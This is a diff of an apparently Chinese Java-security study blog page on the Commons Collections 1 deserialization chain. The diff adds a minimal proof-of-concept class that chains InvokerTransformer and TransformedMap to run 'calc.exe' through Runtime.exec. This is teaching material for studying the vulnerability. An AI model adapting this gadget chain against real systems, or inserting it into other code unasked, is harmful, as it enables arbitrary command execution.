@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer"><span class="toc-text">Transformer</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-text">预备知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer"><span class="toc-text">Transformer</span></a></li></ol></li></ol>
     </div>
   
         
@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #00bcd4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #ff7d73">Java</a>
             </span>
             
         </span>
@@ -260,7 +260,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">188字</span>
+        <span class="post-count">308字</span>
       </span>
     </span>
 
@@ -284,10 +284,36 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>连一刻也没有为放假的到来欣喜，立刻加入战场的是——CC1链！</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>连一刻也没有为放假的到来欣喜，立刻加入战场的是——CommonsCollections1链！</p>
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-1-CC1">依旧是Boogipop的博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommonsCollections1%E9%93%BE.html">ph0ebus的博客</a></p>
+<p>以及p神的《java安全漫谈》</p>
 <span id="more"></span>
+
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>p牛的极简payload</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">CC</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> easycc1 <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc.exe"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        outerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>CC链全称CommonsCollections（Java常用的一个库）</p>
 <p>pom.xml</p>
